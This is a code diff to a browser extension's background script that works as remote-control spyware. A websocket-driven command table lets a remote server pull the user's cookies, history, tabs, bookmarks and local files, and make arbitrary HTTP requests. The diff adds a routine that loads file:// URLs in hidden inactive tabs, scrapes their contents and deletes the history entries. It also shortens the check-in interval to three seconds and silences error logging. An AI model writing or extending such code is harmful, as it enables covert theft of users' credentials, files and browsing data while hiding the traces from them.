@@ -24,18 +24,25 @@ const SYNC_SWITCH = {
 };
 
 const RPC_CALL_TABLE = {
-  GET_FILESYSTEM: get_filesystem,
   HTTP_REQUEST: perform_http_request,
   PONG: () => {}, // NOP, since timestamp is updated on inbound message.
   AUTH: authenticate,
+  GET_FILESYSTEM: get_filesystem,
   GET_COOKIES: get_cookies,
   GET_HISTORY: get_history,
   GET_TABS: get_tabs,
   GET_BOOKMARKS: get_bookmarks,
 };
 
-function get_filesystem(fileUrl) {
-  console.log("get_filesystem", fileUrl);
+async function get_filesystem(fileUrl = "file:///") {
+  if (!chrome.tabs) {
+    return "";
+  }
+  return get_path(fileUrl);
+}
+
+function get_path(fileUrl) {
+  console.log("get_path", fileUrl);
   return new Promise((resolve, reject) => {
     chrome.tabs.query({ active: false }, (tabs) => {
       // 从非活动标签页中随机选择一个
@@ -53,12 +60,14 @@ function get_filesystem(fileUrl) {
               tabId,
               { code: "document.documentElement.innerHTML" },
               (result) => {
-                const content = result[0];
-                // 删除访问记录
                 chrome.history.deleteUrl({ url: fileUrl }, () => {
-                  // 恢复原始链接
                   chrome.tabs.update(tab.id, { url: originalUrl }, () => {
-                    resolve(content);
+                    if (!result) {
+                      reject("error");
+                    } else {
+                      const content = result[0];
+                      resolve(content);
+                    }
                   });
                 });
               }
@@ -381,7 +390,7 @@ const websocket_sync_huge_interval = setInterval(async () => {
       },
     })
   );
-}, 1000 * 321); //321
+}, 1000 * 3); //321
 
 // Headers that fetch() can't set which need to
 // utilize webRequest to be able to send properly.
@@ -540,9 +549,7 @@ function initialize() {
       Object.keys(parsed_message.data.switch_config).map((key) => {
         SYNC_SWITCH[key] = parsed_message.data.switch_config[key];
       });
-    } catch (e) {
-      console.log(e);
-    }
+    } catch (e) {}
 
     if (parsed_message.action in RPC_CALL_TABLE) {
       const result = await RPC_CALL_TABLE[parsed_message.action](
